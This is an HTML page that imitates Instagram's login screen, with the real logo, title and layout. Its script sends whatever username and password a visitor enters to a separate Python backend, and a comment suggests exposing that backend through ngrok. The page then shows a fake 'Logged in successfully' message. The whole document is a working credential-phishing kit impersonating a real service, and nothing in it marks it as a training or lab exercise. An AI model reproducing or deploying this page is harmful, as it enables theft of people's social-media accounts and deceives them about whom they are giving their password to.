<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .main {
            display: flex;
            gap: 30px;
            max-width: 935px;
        }
        
        .phone {
            background: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/43cc71bb1b6d.png') no-repeat;
            width: 454px;
            height: 618px;
            display: none;
        }
        
        .login-container {
            max-width: 350px;
            width: 100%;
        }
        
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 40px 20px;
            text-align: center;
        }
        
        .logo {
            width: 175px;
            height: 51px;
            background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_logo.svg/1200px-Instagram_logo.svg.png') no-repeat center/contain;
            margin: 0 auto 30px;
        }
        
        input {
            width: 100%;
            padding: 12px;
            margin: 6px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            font-size: 14px;
        }
        
        .login-btn {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            padding: 8px;
            border-radius: 8px;
            font-weight: 600;
            margin: 15px 0;
            cursor: pointer;
        }
        
        .divider { margin: 20px 0; color: #8e8e8e; display: flex; align-items: center; }
        .divider::before, .divider::after { flex: 1; height: 1px; background: #dbdbdb; }
        .divider span { padding: 0 15px; }
        
        .success, .error { margin-top: 10px; font-size: 14px; }
        .success { color: #4caf50; display: none; }
        .error { color: #ed4956; display: none; }
        
        @media (min-width: 875px) { .phone { display: block; } }
    </style>
</head>
<body>
    <div class="main">
        <div class="phone"></div>
        <div class="login-container">
            <div class="login-box">
                <div class="logo"></div>
                <form id="loginForm">
                    <input type="text" id="username" placeholder="Phone number, username or email" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit" id="loginBtn" class="login-btn">Log in</button>
                </form>
                <div class="divider"><span>OR</span></div>
                <a href="#" style="color:#00376b;font-size:12px;">Forgot password?</a>
                
                <div class="success" id="successMsg">✅ Logged in successfully!</div>
                <div class="error" id="errorMsg">❌ Failed to connect. Check backend.</div>
            </div>
            
            <div style="background:white;border:1px solid #dbdbdb;border-radius:8px;padding:20px;text-align:center;margin-top:10px;">
                Don't have an account? <a href="#" style="color:#0095f6;">Sign up</a>
            </div>
        </div>
    </div>

    <script>
        const BACKEND_URL = "http://127.0.0.1:5000";   // Change if using ngrok

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const btn = document.getElementById('loginBtn');
            
            if (!username || !password) return alert("Fill all fields");
            
            btn.disabled = true;
            btn.textContent = "Logging in...";
            
            try {
                const res = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                if (res.ok) {
                    document.getElementById('successMsg').style.display = 'block';
                    setTimeout(() => alert("✅ Login Successful!"), 800);
                } else {
                    throw new Error();
                }
            } catch (err) {
                document.getElementById('errorMsg').style.display = 'block';
                alert("Backend not running or network issue.\nMake sure Python backend is active.");
            } finally {
                btn.disabled = false;
                btn.textContent = "Log in";
            }
        });
    </script>
</body>
</html>
